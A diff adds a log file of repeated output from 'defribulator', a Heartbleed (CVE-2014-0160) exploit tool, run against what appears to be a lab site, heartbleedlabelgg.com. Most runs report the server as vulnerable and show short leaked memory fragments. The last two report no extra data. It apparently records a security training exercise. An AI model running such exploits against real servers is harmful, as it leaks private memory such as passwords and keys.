@@ -1,0 +1,202 @@
+
+defribulator v1.20
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: www.heartbleedlabelgg.com:443, 1 times
+Sending Client Hello for TLSv1.0
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Received Server Hello for TLSv1.0
+Analyze the result....
+
+WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 1 of 1
+##################################################################
+
+...AAAAAAAAAAAAAAAAAAAAABCDEFGHIJZu......&.K...9x
+
+
+defribulator v1.20
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: www.heartbleedlabelgg.com:443, 1 times
+Sending Client Hello for TLSv1.0
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Received Server Hello for TLSv1.0
+Analyze the result....
+
+WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 1 of 1
+##################################################################
+
+...AAAAAAAAAAAAAAAAAAAAABCDEFGHI.n.4.6.zd.O...].
+
+
+defribulator v1.20
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: www.heartbleedlabelgg.com:443, 1 times
+Sending Client Hello for TLSv1.0
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Received Server Hello for TLSv1.0
+Analyze the result....
+
+WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 1 of 1
+##################################################################
+
+...AAAAAAAAAAAAAAAAAAAAABCDEFGH/.ow..v...'..z..
+
+
+defribulator v1.20
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: www.heartbleedlabelgg.com:443, 1 times
+Sending Client Hello for TLSv1.0
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Received Server Hello for TLSv1.0
+Analyze the result....
+
+WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 1 of 1
+##################################################################
+
+...AAAAAAAAAAAAAAAAAAAAABCDEFGp....F...I.cJ..
+
+
+defribulator v1.20
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: www.heartbleedlabelgg.com:443, 1 times
+Sending Client Hello for TLSv1.0
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Received Server Hello for TLSv1.0
+Analyze the result....
+
+WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 1 of 1
+##################################################################
+
+...AAAAAAAAAAAAAAAAAAAAABCDEF....}y.j........
+
+
+defribulator v1.20
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: www.heartbleedlabelgg.com:443, 1 times
+Sending Client Hello for TLSv1.0
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Received Server Hello for TLSv1.0
+Analyze the result....
+
+WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 1 of 1
+##################################################################
+
+...AAAAAAAAAAAAAAAAAAAAABCDEB....}..8?..j .}
+
+
+defribulator v1.20
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: www.heartbleedlabelgg.com:443, 1 times
+Sending Client Hello for TLSv1.0
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Received Server Hello for TLSv1.0
+Analyze the result....
+
+WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 1 of 1
+##################################################################
+
+...AAAAAAAAAAAAAAAAAAAAABCD.`...".....J...Z
+
+
+defribulator v1.20
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: www.heartbleedlabelgg.com:443, 1 times
+Sending Client Hello for TLSv1.0
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Received Server Hello for TLSv1.0
+Analyze the result....
+
+WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 1 of 1
+##################################################################
+
+...AAAAAAAAAAAAAAAAAAAAABC.L...t..<].@...+
+
+
+defribulator v1.20
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: www.heartbleedlabelgg.com:443, 1 times
+Sending Client Hello for TLSv1.0
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Received Server Hello for TLSv1.0
+Analyze the result....
+Server processed malformed heartbeat, but did not return any extra data.
+Analyze the result....
+Received alert:
+Please wait... connection attempt 1 of 1
+##################################################################
+
+.F
+
+
+defribulator v1.20
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: www.heartbleedlabelgg.com:443, 1 times
+Sending Client Hello for TLSv1.0
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Analyze the result....
+Received Server Hello for TLSv1.0
+Analyze the result....
+Server processed malformed heartbeat, but did not return any extra data.
+Analyze the result....
+Received alert:
+Please wait... connection attempt 1 of 1
+##################################################################
+
+.F
+
